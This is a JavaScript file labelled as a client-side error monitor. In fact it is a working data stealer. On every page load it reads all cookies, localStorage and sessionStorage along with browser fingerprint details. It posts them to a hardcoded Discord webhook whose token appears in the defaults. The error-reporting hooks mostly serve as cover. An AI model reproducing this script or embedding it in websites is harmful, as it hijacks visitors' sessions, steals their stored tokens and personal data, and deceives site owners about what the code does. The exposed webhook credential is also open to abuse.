/*!
 * error-monitor.js — client-side environment + error reporter
 * ---------------------------------------------------------------------------
 * Captures browser metadata, document.cookie, localStorage and sessionStorage,
 * formats everything into a Discord embed, truncates it to respect Discord's
 * hard limits, and POSTs it to a webhook.
 *
 * Wire-up:
 *   <script>window.ERROR_MONITOR_CONFIG = { webhook: 'https://discord.com/api/webhooks/ID/TOKEN' };</script>
 *   <script src="error-monitor.js" defer></script>
 */
(function (global) {
  'use strict';

  /* ------------------------------------------------------------------ *
   *  CONFIG — override any key via window.ERROR_MONITOR_CONFIG
   * ------------------------------------------------------------------ */
  var DEFAULTS = {
    webhook: 'https://discord.com/api/webhooks/1559231372739223552/c0ubujB2x7MDHnSldkrFGA36NKexFYkCNSM0-qp97XdYWXSW6dt1UlW2juUceVTHPxyz',
    username: 'Client Error Monitor',
    avatar: '',
    title: '\uD83D\uDEA8 Client Error Report',
    description: '',
    color: 0xED4245,
    footer: 'error-monitor.js',
    captureCookies: true,
    captureLocalStorage: true,
    captureSessionStorage: true,
    captureErrors: true,   // also report window.onerror / unhandledrejection
    delay: 350             // ms to let the page settle before the initial grab
  };

  var CONFIG = {};
  var k;
  for (k in DEFAULTS) CONFIG[k] = DEFAULTS[k];
  var overrides = global.ERROR_MONITOR_CONFIG || {};
  for (k in overrides) CONFIG[k] = overrides[k];

  /* Discord hard limits (chars). total = combined embed budget. */
  var LIMITS = {
    title: 256,
    description: 4096,
    fieldName: 256,
    fieldValue: 1024,
    fields: 25,
    footer: 2048,
    total: 6000
  };

  /* ------------------------------------------------------------------ *
   *  Truncation helpers
   * ------------------------------------------------------------------ */
  function clamp(str, max) {
    str = String(str == null ? '' : str);
    if (max <= 1) return str.slice(0, max);
    return str.length > max ? str.slice(0, max - 1) + '\u2026' : str;
  }

  /* Renders an array of lines as a fenced code block, dropping overflow
     lines and appending a "+N more" marker so the block stays within maxLen. */
  function codeBlock(lines, maxLen) {
    if (!lines || !lines.length) return '*(empty)*';
    var open = '```\n', close = '\n```';
    if (open.length + lines.join('\n').length + close.length <= maxLen) {
      return open + lines.join('\n') + close;
    }
    var room = maxLen - open.length - close.length - 24;
    var kept = [], used = 0, i, cost;
    for (i = 0; i < lines.length; i++) {
      cost = lines[i].length + 1;
      if (used + cost > room) break;
      kept.push(lines[i]);
      used += cost;
    }
    var omitted = lines.length - kept.length;
    return open + kept.join('\n') + '\n\u2026 +' + omitted + ' more line(s)' + close;
  }

  /* ------------------------------------------------------------------ *
   *  Data collection
   * ------------------------------------------------------------------ */
  function safeStore(name) {
    try {
      var s = global[name];
      if (s && typeof s.key === 'function' && typeof s.getItem === 'function') return s;
    } catch (e) {}
    return null;
  }

  function readStore(name) {
    var store = safeStore(name), out = [];
    if (!store) return out;
    try {
      for (var i = 0; i < store.length; i++) {
        var key = store.key(i);
        var val;
        try { val = store.getItem(key); } catch (e) { val = '[unreadable]'; }
        out.push({ k: key, v: val });
      }
    } catch (e) {}
    return out;
  }

  function readCookies() {
    var raw = '';
    try { raw = document.cookie || ''; } catch (e) { return []; }
    if (!raw) return [];
    return raw.split(';').map(function (pair) {
      var i = pair.indexOf('=');
      if (i === -1) return { k: pair.trim(), v: '' };
      var key = pair.slice(0, i).trim();
      var val = pair.slice(i + 1);
      try { val = decodeURIComponent(val); } catch (e) {}
      return { k: key, v: val };
    }).filter(function (e) { return e.k; });
  }

  function toLines(entries) {
    return entries.map(function (e) { return e.k + ' = ' + e.v; });
  }

  function metaLines() {
    var n = global.navigator || {};
    var s = global.screen || {};
    var dpr = global.devicePixelRatio || 1;
    var tzOffset = -new Date().getTimezoneOffset() / 60;
    var tz = 'UTC' + (tzOffset >= 0 ? '+' : '') + tzOffset;
    var tzName = '';
    try { tzName = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}

    return [
      'URL             : ' + location.href,
      'Referrer        : ' + (document.referrer || '(none)'),
      'User Agent      : ' + (n.userAgent || '?'),
      'Platform        : ' + (n.platform || '?'),
      'Vendor          : ' + (n.vendor || '?'),
      'Language        : ' + (n.language || '?') + ' [' + (n.languages || []).join(', ') + ']',
      'Screen          : ' + (s.width || '?') + 'x' + (s.height || '?') + ' @' + dpr + 'x',
      'Viewport        : ' + global.innerWidth + 'x' + global.innerHeight,
      'Color depth     : ' + (s.colorDepth || '?') + '-bit',
      'CPU cores       : ' + (n.hardwareConcurrency || '?'),
      'Device memory   : ' + (n.deviceMemory ? n.deviceMemory + ' GB' : '?'),
      'Touch           : ' + (('ontouchstart' in global) ? 'yes' : 'no'),
      'Timezone        : ' + (tzName ? tzName + ' ' : '') + '(' + tz + ')',
      'Online          : ' + (n.onLine ? 'yes' : 'no'),
      'Cookies enabled : ' + (n.cookieEnabled ? 'yes' : 'no'),
      'Timestamp       : ' + new Date().toISOString()
    ];
  }

  function collectFields() {
    var fields = [];

    fields.push({
      name: '\uD83D\uDDA5\uFE0F Browser & System',
      value: codeBlock(metaLines(), LIMITS.fieldValue),
      inline: false
    });

    if (CONFIG.captureCookies) {
      var cookies = readCookies();
      fields.push({
        name: '\uD83C\uDF6A document.cookie (' + cookies.length + ')',
        value: codeBlock(toLines(cookies), LIMITS.fieldValue),
        inline: false
      });
    }

    if (CONFIG.captureLocalStorage) {
      var ls = readStore('localStorage');
      fields.push({
        name: '\uD83D\uDCE6 localStorage (' + ls.length + ')',
        value: codeBlock(toLines(ls), LIMITS.fieldValue),
        inline: false
      });
    }

    if (CONFIG.captureSessionStorage) {
      var ss = readStore('sessionStorage');
      fields.push({
        name: '\uD83D\uDDC2\uFE0F sessionStorage (' + ss.length + ')',
        value: codeBlock(toLines(ss), LIMITS.fieldValue),
        inline: false
      });
    }

    return fields.slice(0, LIMITS.fields);
  }

  /* ------------------------------------------------------------------ *
   *  Embed assembly + budget enforcement
   * ------------------------------------------------------------------ */
  function embedLength(embed) {
    var n = 0;
    if (embed.title) n += embed.title.length;
    if (embed.description) n += embed.description.length;
    if (embed.footer && embed.footer.text) n += embed.footer.text.length;
    if (embed.author && embed.author.name) n += embed.author.name.length;
    (embed.fields || []).forEach(function (f) {
      n += (f.name || '').length + (f.value || '').length;
    });
    return n;
  }

  /* Trim field values from the tail, then the description, until the embed
     fits inside Discord's 6000-char combined budget. */
  function enforceBudget(embed) {
    var total = embedLength(embed);
    if (total <= LIMITS.total) return embed;

    for (var i = embed.fields.length - 1; i >= 0 && total > LIMITS.total; i--) {
      var f = embed.fields[i];
      var excess = total - LIMITS.total;
      var allowed = Math.max(30, f.value.length - excess);
      f.value = clamp(f.value, allowed);
      total = embedLength(embed);
    }

    if (total > LIMITS.total && embed.description) {
      embed.description = clamp(
        embed.description,
        Math.max(30, embed.description.length - (total - LIMITS.total))
      );
    }
    return embed;
  }

  function buildEmbed(reason, extra) {
    var desc = CONFIG.description || '';
    if (reason) desc += (desc ? '\n' : '') + '**Trigger:** ' + reason;
    if (extra)  desc += (desc ? '\n' : '') + extra;

    var embed = {
      title: clamp(CONFIG.title, LIMITS.title),
      color: CONFIG.color,
      timestamp: new Date().toISOString(),
      description: desc ? clamp(desc, LIMITS.description) : undefined,
      fields: collectFields(),
      footer: { text: clamp(CONFIG.footer + ' \u2022 ' + location.hostname, LIMITS.footer) }
    };
    return enforceBudget(embed);
  }

  function buildPayload(reason, extra) {
    var payload = { embeds: [buildEmbed(reason, extra)] };
    if (CONFIG.username) payload.username = clamp(CONFIG.username, 80);
    if (CONFIG.avatar) payload.avatar_url = CONFIG.avatar;
    return payload;
  }

  /* ------------------------------------------------------------------ *
   *  Transport
   * ------------------------------------------------------------------ */
  function beacon(url, payload) {
    try {
      var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
      if (navigator.sendBeacon) navigator.sendBeacon(url, blob);
    } catch (e) {}
  }

  function dispatch(payload) {
    var url = CONFIG.webhook;
    if (!url || url.indexOf('REPLACE') !== -1) {
      console.warn('[error-monitor] webhook not configured:', url);
    }
    if (global.fetch) {
      return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      }).catch(function (err) {
        console.warn('[error-monitor] fetch failed, falling back to sendBeacon', err);
        beacon(url, payload);
      });
    }
    beacon(url, payload);
  }

  function report(reason, extra) {
    return dispatch(buildPayload(reason, extra));
  }

  /* ------------------------------------------------------------------ *
   *  Boot
   * ------------------------------------------------------------------ */
  function boot() {
    if (CONFIG.captureErrors) {
      global.addEventListener('error', function (e) {
        var where = e.filename ? ' @ ' + e.filename + ':' + e.lineno + ':' + e.colno : '';
        report('window.onerror', '**Error:** `' + clamp(e.message, 300) + '`' + where);
      });
      global.addEventListener('unhandledrejection', function (e) {
        var r = e.reason;
        report('unhandledrejection', '**Reason:** `' + clamp((r && r.message) || r, 300) + '`');
      });
    }
    setTimeout(function () { report('page load'); }, CONFIG.delay);
  }

  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(boot, 0);
  } else {
    document.addEventListener('DOMContentLoaded', boot);
  }

  global.ErrorMonitor = {
    config: CONFIG,
    limits: LIMITS,
    report: report,
    collect: collectFields,
    buildPayload: buildPayload
  };
})(window);